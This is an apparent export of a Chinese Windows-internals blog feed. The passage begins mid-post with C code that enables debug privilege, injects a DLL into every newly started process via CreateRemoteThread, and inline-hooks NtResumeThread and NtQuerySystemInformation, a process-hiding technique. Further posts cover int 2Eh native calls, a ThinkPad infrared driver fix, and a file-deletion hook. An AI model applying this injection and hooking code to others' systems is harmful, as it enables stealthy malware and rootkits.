&amp;hToken)) &#123;<br><br>      <span class="hljs-comment">// Attempt to modify the &quot;Debug&quot; privilege</span><br>      TOKEN_PRIVILEGES tp;<br>      tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>      LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>      tp.Privileges[<span class="hljs-number">0</span>].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : <span class="hljs-number">0</span>;<br>      AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>      fOk = (GetLastError() == ERROR_SUCCESS);<br>      CloseHandle(hToken);<br>   &#125;<br>   <span class="hljs-keyword">return</span>(fOk);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ThreadBasicInformation 0</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(HANDLE hProcess)</span>&#123;<br><br>    <span class="hljs-type">char</span> CurPath[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    GetSystemDirectory(CurPath, <span class="hljs-number">256</span>);<br>    <span class="hljs-built_in">strncat</span>(CurPath, <span class="hljs-string">&quot;\\Hook.dll&quot;</span>, <span class="hljs-number">9</span>);<br>    <span class="hljs-comment">//strcpy(CurPath, &quot;C:\\WINDOWS\\system32\\Hook.dll&quot;);</span><br>    PWSTR pszLibFileRemote = <span class="hljs-literal">NULL</span>;<br><br><br>    <span class="hljs-type">int</span> len = (lstrlen(CurPath)+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>;<br>    WCHAR wCurPath[<span class="hljs-number">256</span>];<br>    MultiByteToWideChar(CP_ACP,<span class="hljs-number">0</span>,CurPath,<span class="hljs-number">-1</span>,wCurPath,<span class="hljs-number">256</span>);<br><br>    EnableDebugPrivilege(<span class="hljs-number">1</span>);<br><br>    pszLibFileRemote = (PWSTR)<br>        VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pszLibFileRemote,<br>        (PVOID) wCurPath, len, <span class="hljs-literal">NULL</span>);<br><br>    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)<br>         GetProcAddress(GetModuleHandle(TEXT(<span class="hljs-string">&quot;Kernel32&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    HANDLE hRemoteThread = CreateRemoteThread(hProcess,<br>                                                      <span class="hljs-literal">NULL</span>,<br>                                                      <span class="hljs-number">0</span>,<br>                                                      pfnThreadRtn,<br>                                                      pszLibFileRemote,<br>                                                      <span class="hljs-number">0</span>,<br>                                                      <span class="hljs-literal">NULL</span>);<br>    WaitForSingleObject(hRemoteThread, INFINITE);<br>    CloseHandle(hRemoteThread);<br><br>    EnableDebugPrivilege(<span class="hljs-number">0</span>);<br><br>&#125;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtResumeThread</span><span class="hljs-params">(IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL)</span><br>&#123;<br><br>    NTSTATUS ret;<br>    NTSTATUS nStatus;<br>    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;<br>    NTQUERYINFORMATIONTHREAD NtQueryInformationThread = <span class="hljs-literal">NULL</span>;<br>    THREAD_BASIC_INFORMATION ti;<br>    DWORD Pid = <span class="hljs-number">0</span>;<br><br>    HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br>    NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,<br>                                                             <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br>    NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll,<br>                                                             <span class="hljs-string">&quot;NtQueryInformationThread&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (NtQueryInformationThread == <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;can&#x27;t get NtQueryInformationThread&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    &#125;<br><br>    nStatus = NtQueryInformationThread(ThreadHandle,<br>                                           ThreadBasicInformation,<br>                                           (PVOID)&amp;ti,<br>                       <span class="hljs-keyword">sizeof</span>(THREAD_BASIC_INFORMATION),<br>                                           <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span>(nStatus != STATUS_SUCCESS)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;fuck failed&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    &#125;<br><br>    Pid = (DWORD)(ti.ClientId.UniqueProcess);<br><br>    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, Pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;open process failed&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br>    BYTE FirstByte[<span class="hljs-number">1</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-comment">// check if the process has been hooked</span><br>    ReadProcessMemory(hProcess, NtQuerySystemInformation, FirstByte, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 已经被Hook了</span><br>    <span class="hljs-keyword">if</span> ( FirstByte[<span class="hljs-number">0</span>] == <span class="hljs-number">0xe9</span>)<br>    &#123;<br><br>       HookOff();<br>       ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);<br>       HookOn();<br><br>       CloseHandle(hProcess);<br><br>       <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">// 创建新进程的调用，Hook 之</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        HookOff();<br>        inject(hProcess);<br>        ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);<br>        HookOn();<br><br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">            IN ULONG SystemInformationClass,</span><br><span class="hljs-params">            IN PVOID SystemInformation,</span><br><span class="hljs-params">            IN ULONG SystemInformationLength,</span><br><span class="hljs-params">            OUT PULONG ReturnLength)</span><br>&#123;<br>    NTSTATUS ntStatus;<br><br>    HookOff();<br>    ntStatus = g_pfNtQuerySystemInformation(SystemInformationClass,<br>                                                SystemInformation,<br>                                                SystemInformationLength,<br>                                                ReturnLength);<br>    HookOn();<br><br>   <span class="hljs-keyword">return</span> ntStatus;<br>&#125;<br><br><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOn</span><span class="hljs-params">()</span><br>&#123;<br>    PMEMORY_BASIC_INFORMATION lpAllocBuffer = <span class="hljs-literal">NULL</span>;<br>    DWORD dwOldProtect, dwOldProtect2;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br><br>    <br>    dwIdOld = GetCurrentProcessId();<br>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, dwIdOld);<br>    <span class="hljs-keyword">if</span>(hProcess == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> ;<br><br>     HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>     g_pfNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,<br>                                                    <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br><br>     <span class="hljs-keyword">if</span> (g_pfNtQuerySystemInformation == <span class="hljs-literal">NULL</span>)<br>     &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br><br>     g_pfNtResumeThread = (NTRESUMETHREAD)GetProcAddress(hNtdll, <span class="hljs-string">&quot;NtResumeThread&quot;</span>);<br><br>     <span class="hljs-keyword">if</span> (g_pfNtResumeThread == <span class="hljs-literal">NULL</span>)<br>     &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br><br>     EnterCriticalSection(&amp;cs);<br><br>    _asm<br>    &#123;<br>        lea edi,g_OldNtQuerySystemInformation<br>        mov esi,g_pfNtQuerySystemInformation<br>        cld<br>        mov ecx,<span class="hljs-number">5</span><br>        rep movsb<br>        lea edi,g_OldNtResumeThread<br>        mov esi,g_pfNtResumeThread<br>        cld<br>        mov ecx,<span class="hljs-number">5</span><br>        rep movsb<br>    &#125;<br><br>    g_NewNtQuerySystemInformation[<span class="hljs-number">0</span>] = <span class="hljs-number">0xe9</span>;<br>    g_NewNtResumeThread[<span class="hljs-number">0</span>] = <span class="hljs-number">0xe9</span>;<br>    _asm<br>    &#123;<br>        lea eax, NewNtQuerySystemInformation<br>        mov ebx, g_pfNtQuerySystemInformation<br>        sub eax, ebx<br>        sub eax, <span class="hljs-number">5</span><br>        mov dword ptr [g_NewNtQuerySystemInformation + <span class="hljs-number">1</span>], eax<br>        lea eax, NewNtResumeThread<br>        mov ebx, g_pfNtResumeThread<br>        sub eax, ebx<br>        sub eax, <span class="hljs-number">5</span><br>        mov dword ptr [g_NewNtResumeThread + <span class="hljs-number">1</span>], eax<br>    &#125;<br>    .......<br>    LeaveCriticalSection(&amp;cs);<br><br>    g_bHook = TRUE;<br>&#125;<br><br><span class="hljs-comment">// 还原被修改的代码</span><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOff</span><span class="hljs-params">()</span><br>&#123;<br>    ......<br>    g_bHook = FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4. 参考资料"></a>4. 参考资料</h2><p>Microsoft MSDN，SDK &amp; DDK<br>《Windows NT 2000 Native API Reference》<br>《Windows 核心编程》<br>《挂钩Windows API》<br>《如何在Windows NT中隐藏自己》</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>int 2eh 方式调用Native api</title>
    <link href="/cn/int23_native_api/"/>
    <url>/cn/int23_native_api/</url>
    
    <content type="html"><![CDATA[<p>小技巧。但是用的人好像不多。例子：  Windows 2000 下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">NtQuerySystemInformationNo = <span class="hljs-number">0x97</span>;<br><br>_declspec(naked)<br>NTSTATUS __stdcall <span class="hljs-title function_">PrivateNtQuerySystemInformation</span><br>    <span class="hljs-params">(IN     SYSTEM_INFORMATION_CLASS,</span><br><span class="hljs-params">    IN OUT PVOID,</span><br><span class="hljs-params">    IN     ULONG,</span><br><span class="hljs-params">    OUT    PULONG OPTIONAL)</span><br>&#123;<br><br>    _asm &#123;<br>        mov eax, NtQuerySystemInformationNo<br>        lea edx, [esp+<span class="hljs-number">4</span>]<br>        <span class="hljs-type">int</span> <span class="hljs-number">2</span>Eh<br>        ret <span class="hljs-number">10</span>h<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>联想 IBM THINKPAD T60装windows 2003/2008红外线设备驱动解决</title>
    <link href="/cn/T60_device/"/>
    <url>/cn/T60_device/</url>
    
    <content type="html"><![CDATA[<p>Intel(R) 82801GBM (ICH7-M) LPC Interface Controller - 27B9（ACPI\IBM0071\4&amp;61F3B4B&amp;0）是Intel的红外线设备连接。</p><p>win2003&#x2F;2008等服务器版本没有自带这个驱动。IBM T60等机器可以在主板里设置关闭INTERFACE，或者下载XP的红外线补丁（IBM Thinkpad Fast Infrared Port）就可以解决</p><p>相关链接：<br><a href="http://www-307.ibm.com/pc/support/site.wss/document.do?sitestyle=lenovo&lndocid=MIGR-4KUR6S">http://www-307.ibm.com/pc/support/site.wss/document.do?sitestyle=lenovo&amp;lndocid=MIGR-4KUR6S</a><br><a href="http://www.versiontracker.com/dyn/moreinfo/win/36353">http://www.versiontracker.com/dyn/moreinfo/win/36353</a><br><a href="http://www.soft32.com/download_181790.html">http://www.soft32.com/download_181790.html</a><br><a href="http://forum.thinkpads.com/viewtopic.php?t=22787&sid=3a24f025ddb4d19d3e2d00e122c84957">http://forum.thinkpads.com/viewtopic.php?t=22787&amp;sid=3a24f025ddb4d19d3e2d00e122c84957</a></p><p>具体解决办法：</p><p>第一方法：BIOS设置：</p><p>Config(设置)选项—Infrared(红外线接口)选项,设为禁用(Disable)<br>Config(设置)选项—Infrared Device(红外线设备)选项,设为禁用(Hidden)</p><p>第二方法：下载红外补丁后按下列方法安装：<br>1、解压压缩包，并执行instirda.bat，然后重新启动计算机；<br>2、插入USB红外线设备（笔记本自带红外的看第3步）；<br>3、察看设备管理器，会发现网络适配器处多出一项带叹号的USB Device的项目；<br>4、选择此项目，更新驱动（可用WinXP下的驱动程序）；<br>5、运行reg\Infrared，导入注册表；<br>6、设备管理器中找到那个设备，更新驱动——不要搜索，我要自己选择安装的驱动——IBM thinkpad fast infrared port，然后下一步；<br>7、提示所需文件——找到sys里面的nscirda；<br>8、成功。</p><p>已知问题：<br>1、安装过程中可能，系统提示个别文件无法找到，请手动定位到前面已解压的SYS文件夹处，确认继续。<br>2、使用红外设备后，提示缺文件也是要定位到SYS文件夹进行安装。<br>3、要是提示不能识别，可以重新更新驱动</p><p>Windows server 2003（企业版）红外通讯支持程序（Fro 2003 红外驱动） 下载地址：</p><p><a href="http://www.irxon.com/download/ir2003.zip">http://www.irxon.com/download/ir2003.zip</a><br><a href="http://www.divshare.com/download/4167497-cb3">http://www.divshare.com/download/4167497-cb3</a></p><p>说明：Windows server 2003 （企业版）是一款面向企业用户的高端服务器操作系统，为了安全起见，它没有集成支持IrDA红外通讯的协议软件，所以目前所有的IrDA红外设备都不能在这个操作系统里使用。但是我们可以利用XP系统里的IrDA红外通讯协议软件来解决这个问题,安装时使用红外适配器在XP系统里的驱动程序，缺协议软件就到这个软件包里去找，安装完成后红外适配器就可以在Windows2003里正常工作了。</p><p>PS: T60 装了2003 后一个驱动老是找不到，最后终于找到了正确答案。。：） share it</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ring3 下挂钩Native API 简单实现文件防删除</title>
    <link href="/cn/ring3_undelete/"/>
    <url>/cn/ring3_undelete/</url>
    
    <content type="html"><![CDATA[<p>简单实现文件防删除，说简单是因为没有用很底层的技术，例如文件驱动之类。我只用最简单的方法实现了, 使用 ring3 的API hook 技术。随着技术的发展这种技术已经过不了很多的主动防御技术了。主要是思路和方法和分析过程。(高手飘过)</p><p>ring3 下挂钩 API 基本上也就是修改导入表，和Inline hook 修改前5个字节这几种方法。挂钩Native API 没有什么区别，也就是多声明几个结构和变量类型。</p><p>关于挂钩API 请参见：<a href="http://www.xfocus.net/articles/200403/681.html">www.xfocus.net/articles/200403/681.html</a></p><p>文件删除的ring3 API 是DeleteFile, 此API 存在于kernel32.dll 中，用OD分析一下。(哪个都可以，IDA更不用说)</p><p>DeleteFileA 的反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">7C80D2FB &gt;/$ 8BFF mov edi, edi<br>7C80D2FD |. 55 push ebp<br>7C80D2FE |. 8BEC mov ebp, esp<br>7C80D300 |. FF75 08 push dword ptr [ebp+8]<br>7C80D303 |. E8 17790100 call 7C824C1F<br>7C80D308 |. 85C0 test eax, eax<br>7C80D30A |. 74 08 je short 7C80D314<br>7C80D30C |. FF70 04 push dword ptr [eax+4] ; /FileName<br>7C80D30F |. E8 3D170000 call DeleteFileW ; \DeleteFileW<br>7C80D314 |&gt; 5D pop ebp<br>7C80D315 \. C2 0400 retn 4<br></code></pre></td></tr></table></figure><p>可以得到一个流程 DeleteFileA –&gt; DeleteFileW</p><p>DeleteFileW 的反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs asm">7C80EA51 &gt; $ 8BFF mov edi, edi<br>7C80EA53 . 55 push ebp<br>7C80EA54 . 8BEC mov ebp, esp<br>7C80EA56 . 83EC 50 sub esp, 50<br>7C80EA59 . 56 push esi<br>7C80EA5A . 8D45 C8 lea eax, dword ptr [ebp-38]<br>7C80EA5D . 50 push eax<br>7C80EA5E . 33F6 xor esi, esi<br>7C80EA60 . 56 push esi<br>7C80EA61 . 8D45 E0 lea eax, dword ptr [ebp-20]<br>7C80EA64 . 50 push eax<br>7C80EA65 . FF75 08 push dword ptr [ebp+8]<br>7C80EA68 . C645 FF 00 mov byte ptr [ebp-1], 0<br>7C80EA6C . FF15 5411807C call dword ptr [&lt;&amp;ntdll.RtlDosPathNam&gt;; ntdll.RtlDosPathNameToRelativeNtPathName_U<br>7C80EA72 . 84C0 test al, al<br>7C80EA74 . 0F84 FBCC0200 je 7C83B775<br>7C80EA7A . 8B45 E4 mov eax, dword ptr [ebp-1C]<br>7C80EA7D . 8945 F4 mov dword ptr [ebp-C], eax<br>7C80EA80 . 8B45 C8 mov eax, dword ptr [ebp-38]<br>7C80EA83 . 66:3BC6 cmp ax, si<br>7C80EA86 . 0F85 E9660200 jnz 7C835175<br>7C80EA8C . 8975 D0 mov dword ptr [ebp-30], esi<br>7C80EA8F &gt; 8B45 D0 mov eax, dword ptr [ebp-30]<br>7C80EA92 . 53 push ebx<br>7C80EA93 . 57 push edi<br>7C80EA94 . 8945 B4 mov dword ptr [ebp-4C], eax<br>7C80EA97 . 8D45 E0 lea eax, dword ptr [ebp-20]<br>7C80EA9A . 8945 B8 mov dword ptr [ebp-48], eax<br>7C80EA9D . BF 40402000 mov edi, 204040<br>7C80EAA2 . 57 push edi<br>7C80EAA3 . 6A 07 push 7<br>7C80EAA5 . 8D45 E8 lea eax, dword ptr [ebp-18]<br>7C80EAA8 . 50 push eax<br>7C80EAA9 . 8D45 B0 lea eax, dword ptr [ebp-50]<br>7C80EAAC . 50 push eax<br>7C80EAAD . 68 80000100 push 10080 ; UNICODE &quot;ocuments and<br>7C80EAB2 . 8D45 F8 lea eax, dword ptr [ebp-8]<br>7C80EAB5 . 8975 C0 mov dword ptr [ebp-40], esi<br>7C80EAB8 . 8975 C4 mov dword ptr [ebp-3C], esi<br>7C80EABB . 8B35 1410807C mov esi, dword ptr [&lt;&amp;ntdll.NtOpenFi&gt;; ntdll.ZwOpenFile<br>7C80EAC1 . 50 push eax<br>7C80EAC2 . C745 B0 18000&gt;mov dword ptr [ebp-50], 18<br>7C80EAC9 . C745 BC 40000&gt;mov dword ptr [ebp-44], 40<br>7C80EAD0 . FFD6 call esi ; &lt;&amp;ntdll.NtOpenFile&gt;<br>7C80EAD2 . 8BD8 mov ebx, eax<br>7C80EAD4 . 85DB test ebx, ebx<br>7C80EAD6 .^ 0F8C F5F4FFFF jl 7C80DFD1<br>7C80EADC . 6A 23 push 23 ; /InfoClass = FileAttributeTagInformation<br>7C80EADE . 6A 08 push 8 ; |Bufsize = 8<br>7C80EAE0 . 8D45 D8 lea eax, dword ptr [ebp-28] ; |<br>7C80EAE3 . 50 push eax ; |Buffer<br>7C80EAE4 . 8D45 E8 lea eax, dword ptr [ebp-18] ; |<br>7C80EAE7 . 50 push eax ; |pStatusBlock<br>7C80EAE8 . FF75 F8 push dword ptr [ebp-8] ; |hFile<br>7C80EAEB . FF15 1810807C call dword ptr [&lt;&amp;ntdll.NtQueryInform&gt;; \ZwQueryInformationFile<br>7C80EAF1 . 8BD8 mov ebx, eax<br>7C80EAF3 . 85DB test ebx, ebx<br>7C80EAF5 . 0F8C D5CC0200 jl 7C83B7D0<br>7C80EAFB . 8B45 D8 mov eax, dword ptr [ebp-28]<br>7C80EAFE . 25 00040000 and eax, 400<br>7C80EB03 . 0F85 0ECD0200 jnz 7C83B817<br>7C80EB09 &gt; 85C0 test eax, eax<br>7C80EB0B . 0F85 1CCD0200 jnz 7C83B82D<br>7C80EB11 &gt; 8D45 C8 lea eax, dword ptr [ebp-38]<br>7C80EB14 . 50 push eax<br>7C80EB15 . FF15 5011807C call dword ptr [&lt;&amp;ntdll.RtlReleaseRel&gt;; ntdll.RtlReleaseRelativeName<br>7C80EB1B . FF75 F4 push dword ptr [ebp-C]<br>7C80EB1E . 64:A1 1800000&gt;mov eax, dword ptr fs:[18]<br>7C80EB24 . 8B40 30 mov eax, dword ptr [eax+30]<br>7C80EB27 . 6A 00 push 0<br>7C80EB29 . FF70 18 push dword ptr [eax+18]<br>7C80EB2C . FF15 1010807C call dword ptr [&lt;&amp;ntdll.RtlFreeHeap&gt;] ; ntdll.RtlFreeHeap<br>7C80EB32 . 6A 0D push 0D ; /InfoClass = FileDispositionInformation<br>7C80EB34 . 6A 01 push 1 ; |Bufsize = 1<br>7C80EB36 . 8D45 0B lea eax, dword ptr [ebp+B] ; |<br>7C80EB39 . 50 push eax ; |Buffer<br>7C80EB3A . 8D45 E8 lea eax, dword ptr [ebp-18] ; |<br>7C80EB3D . 50 push eax ; |pStatusBlock<br>7C80EB3E . FF75 F8 push dword ptr [ebp-8] ; |hFile<br>7C80EB41 . C645 0B 01 mov byte ptr [ebp+B], 1 ; |<br>7C80EB45 . FF15 3010807C call dword ptr [&lt;&amp;ntdll.NtSetInformat&gt;; \ntdll.ZwSetInformationFile<br>7C80EB4B . FF75 F8 push dword ptr [ebp-8] ; /Handle<br>7C80EB4E . 8BF0 mov esi, eax ; |<br>7C80EB50 . FF15 3810807C call dword ptr [&lt;&amp;ntdll.NtClose&gt;] ; \ZwClose<br>7C80EB56 . 85F6 test esi, esi<br>7C80EB58 .^ 0F8C 1F91FFFF jl 7C807C7D<br>7C80EB5E . 33C0 xor eax, eax<br>7C80EB60 . 40 inc eax<br>7C80EB61 &gt; 5F pop edi<br>7C80EB62 . 5B pop ebx<br>7C80EB63 &gt; 5E pop esi<br>7C80EB64 . C9 leave<br>7C80EB65 . C2 0400 retn 4<br></code></pre></td></tr></table></figure><p>得到一个流程 DeleteFileA –&gt; DeleteFileW –&gt; ntdll.ZwSetInformationFile，因此我们只要挂钩了ZwSetInformationFile 就可以简单实现目标了。这里写出了新的 ZwSetInformationFile 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> LONG NTSTATUS;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS ((NTSTATUS)0x00000000L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> &#123;</span><br>DWORD Status;<br>ULONG Information;<br>&#125; IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">FILE_INFORMATION_CLASS</span> &#123;</span><br><span class="hljs-comment">// end_wdm</span><br>FileDirectoryInformation = <span class="hljs-number">1</span>,<br>FileFullDirectoryInformation, <span class="hljs-comment">// 2</span><br>FileBothDirectoryInformation, <span class="hljs-comment">// 3</span><br>FileBasicInformation, <span class="hljs-comment">// 4 wdm</span><br>FileStandardInformation, <span class="hljs-comment">// 5 wdm</span><br>FileInternalInformation, <span class="hljs-comment">// 6</span><br>FileEaInformation, <span class="hljs-comment">// 7</span><br>FileAccessInformation, <span class="hljs-comment">// 8</span><br>FileNameInformation, <span class="hljs-comment">// 9</span><br>FileRenameInformation, <span class="hljs-comment">// 10</span><br>FileLinkInformation, <span 